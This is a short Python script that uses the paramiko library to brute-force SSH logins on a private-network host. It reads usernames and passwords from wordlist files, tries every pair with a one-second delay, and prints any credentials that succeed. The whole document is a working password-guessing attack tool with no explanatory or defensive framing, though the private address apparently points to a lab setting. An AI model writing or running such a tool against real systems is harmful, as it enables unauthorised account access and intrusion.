import paramiko
import time

host = "192.168.100.138"
port = 22
user_file = "/home/bdoor/user.txt"
pass_file = "/home/bdoor/pass.txt"

def try_login(username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] SUCCESS: {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Invalid:  {username}:{password}")
    except paramiko.SSHException as e:
        print(f"[!] SSH Error: {e}")
    except Exception as e:
        print(f"[!] Other Error: {e}")
    return False

with open(user_file, "r") as users:
    for user in users:
        user = user.strip()
        with open(pass_file, "r") as passwords:
            for pwd in passwords:
                pwd = pwd.strip()
                if try_login(user, pwd):
                    exit(0)
                time.sleep(1)  # Wait 1 second to avoid banner issues
